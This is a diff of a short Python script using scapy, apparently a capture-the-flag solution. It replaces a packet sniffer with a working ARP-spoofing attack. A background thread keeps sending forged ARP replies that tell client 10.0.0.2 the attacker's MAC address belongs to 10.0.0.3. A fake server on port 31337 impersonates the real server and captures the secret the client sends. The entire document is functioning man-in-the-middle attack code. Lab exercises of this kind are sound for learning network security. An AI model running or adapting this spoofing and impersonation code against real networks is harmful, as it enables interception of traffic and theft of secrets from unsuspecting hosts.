@@ -1,30 +1,32 @@
-from scapy.all import Ether, sendp, ARP, get_if_hwaddr, sniff, Raw, TCP
-from multiprocessing import Process
-import socket
+from scapy.all import ARP, send, get_if_hwaddr
+import socket, threading, time
 
-def handle_packet(packet):
-    print(packet.summary())
-    try:
-        print(packet[Raw].load)
-    except:
-        print("waaaa\n")
+iface = "eth0"
+my_ip = "10.0.0.1"
+my_mac = get_if_hwaddr(iface)
 
-def listener():
-    recvpacket = sniff(count=100, filter="ip host 10.0.0.3", prn=handle_packet)
+def arp_spoof():
+    # Tell client 10.0.0.2 that you (10.0.0.1) are 10.0.0.3
+    spoof = ARP(op=2, pdst="10.0.0.2", psrc="10.0.0.3", hwsrc=my_mac)
+    while True:
+        send(spoof, iface=iface, verbose=0)
+        time.sleep(2)
 
+def fake_server():
+    # Bind to 10.0.0.3 to impersonate the server
+    s = socket.socket()
+    s.bind(("0.0.0.0", 31337))
+    s.listen(1)
+    print("[*] Waiting for client to send the flag...")
+    conn, addr = s.accept()
+    print(f"[+] Connection from {addr}")
+    data = conn.recv(1024)
+    print("[+] Got flag:", data.decode(errors="ignore"))
+    conn.close()
+    s.close()
 
-def arp_forge():
-    iface = "eth0"
-    my_mac = get_if_hwaddr(iface)
+# Start ARP spoofing in background
+threading.Thread(target=arp_spoof, daemon=True).start()
 
-    eth = Ether(src=my_mac ,type=0x0806)
-    arp = ARP(op=2, hwsrc=my_mac, psrc="10.0.0.2", pdst="10.0.0.3")
-    pckt = eth / arp
-    sendp(pckt)
-
-p1= Process(target=listener)
-# p2= Process(target=arp_forge)
-p1.start()
-# p2.start()
-p1.join()
-# p2.join()
+# Run fake server to catch the flag
+fake_server()
